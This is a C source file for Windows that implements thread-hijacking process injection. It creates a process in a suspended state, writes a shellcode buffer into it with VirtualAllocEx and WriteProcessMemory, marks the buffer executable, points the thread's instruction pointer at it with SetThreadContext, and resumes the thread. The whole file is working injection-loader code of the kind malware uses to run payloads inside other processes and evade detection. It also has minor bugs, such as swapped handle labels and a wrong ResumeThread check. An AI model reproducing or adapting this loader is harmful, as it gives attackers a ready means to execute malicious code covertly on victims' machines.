#include "box.h"

BOOL CreateSuspendedProcess
(
	IN  LPCSTR  ProcessName,
	OUT PHANDLE hProcess,
	OUT PHANDLE hThread,
	OUT PDWORD  PID
)
{

	BOOL				State = TRUE;
	STARTUPINFOA		StartupInfo;
	PROCESS_INFORMATION ProcessInfo;

	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));

	StartupInfo.cb = sizeof(STARTUPINFO);

	if (!CreateProcessA(NULL, ProcessName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &StartupInfo, &ProcessInfo))
	{
		PRINT_ERROR("CreateProcessA");
		State = FALSE; goto CLEANUP;
	}

	if (!ProcessInfo.hProcess)
	{
		WARN("Failed to Create Process");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Thread Handle", ProcessInfo.hProcess);
	INFO("[0x%p] Process Handle", ProcessInfo.hThread);
	INFO("[%d] Process ID", ProcessInfo.dwProcessId);

	*PID = ProcessInfo.dwProcessId;
	*hProcess = ProcessInfo.hProcess;
	*hThread = ProcessInfo.hThread;


CLEANUP:

	return State;

}

BOOL InjectThread
(
	IN	HANDLE	hProcess,
	IN	PBYTE	sShellcode,
	IN	SIZE_T	sSizeofShellcode,
	OUT PVOID*	pAddress
)

{

	BOOL	State			= TRUE, 
			status			= TRUE;
	PVOID	rBuffer			= NULL;
	SIZE_T	sBytesWritten	= 0;
	DWORD	dwOldProt		= 0;

	if (!hProcess || !sShellcode || !sSizeofShellcode)
	{
		WARN("Parameters not Supplied");
		State = FALSE; goto CLEANUP;
	}

	rBuffer = VirtualAllocEx(hProcess, NULL, sSizeofShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (rBuffer == NULL)
	{
		PRINT_ERROR("VirtualAllocEx");
		State = FALSE; goto CLEANUP;
	}

	INFO("Allocated %zu bytes to Buffer via VirtualAllocEx!", sSizeofShellcode);

	if (!WriteProcessMemory(hProcess, rBuffer, sShellcode, sSizeofShellcode, &sBytesWritten))
	{
		PRINT_ERROR("WriteProcessMemory");
		State = FALSE; goto CLEANUP;
	}

	INFO("Successfully Wrote Allocated Bytes to Memory via WriteProcessMemory!");

	if (!VirtualProtectEx(hProcess, rBuffer, sSizeofShellcode, PAGE_EXECUTE_READ, &dwOldProt))
	{
		PRINT_ERROR("VirtualProtectEx");
		State = FALSE; goto CLEANUP;
	}

	INFO("Changed Allocation Rights | Page_ReadWrite --> Page_Execute_Read");

	*pAddress = rBuffer;

CLEANUP:


	return State;

}

BOOL HijackThread
(
	IN HANDLE hThread,
	IN PVOID  pRemoteAddress
)
{

	BOOL State = TRUE;

	CONTEXT ThreadCtx;
	RtlSecureZeroMemory(&ThreadCtx, sizeof(ThreadCtx));
	ThreadCtx.ContextFlags = CONTEXT_FULL;

	if (!hThread || !pRemoteAddress)
	{
		PRINT_ERROR("hThread, pRemoteAddress");
		State = FALSE; goto CLEANUP;
	}

	if (!GetThreadContext(hThread, &ThreadCtx))
	{
		PRINT_ERROR("GetThreadContext");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Current Thread Context", ThreadCtx);

	printf(
		"_______________\n"
		"|				\n"
		"| [RAX]: [0X%P]\n"
		"| [RBX]: [0X%P]\n"
		"| [RCX]: [0X%P]\n"
		"| [RDX]: [0X%P]\n"
		"| [RSP]: [0X%P]\n"
		"| [RSI]: [0X%P]\n"
		"| [RDI]: [0X%P]\n"
		"| [RIP]: [0X%P]\n"
		"|				\n"
		"_______________\n",
		(PVOID*)ThreadCtx.Rax, (PVOID*)ThreadCtx.Rbx, (PVOID*)ThreadCtx.Rcx, (PVOID*)ThreadCtx.Rdx,
		(PVOID*)ThreadCtx.Rsp, (PVOID*)ThreadCtx.Rsi, (PVOID*)ThreadCtx.Rdi, (PVOID*)ThreadCtx.Rip
	);

	INFO("[RIP] --> [0x%p] Updating Instruction Pointer...", (PVOID*)ThreadCtx.Rip);

	ThreadCtx.Rip = (DWORD64)pRemoteAddress;

	if (!SetThreadContext(hThread, &ThreadCtx))
	{
		PRINT_ERROR("SetThreadContext");
		State = FALSE; goto CLEANUP;
	}

	OKAY("[RIP] --> [0x%p] Instruction Updated... Pointing to out Allocated Buffer --> [0x%p]", (PVOID*)ThreadCtx.Rip, pRemoteAddress);

	if (!ResumeThread(hThread))
	{
		PRINT_ERROR("ResumeThread");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] waiting for thread to finish execution...", hThread);

	WaitForSingleObject(hThread, INFINITE);

	INFO("[0x%p] thread finished execution! beginning cleanup...", hThread);

CLEANUP:

	if (pRemoteAddress)
		VirtualFree(pRemoteAddress, 0, MEM_RELEASE);

	if (hThread)
		CloseHandle(hThread);

	return State;
}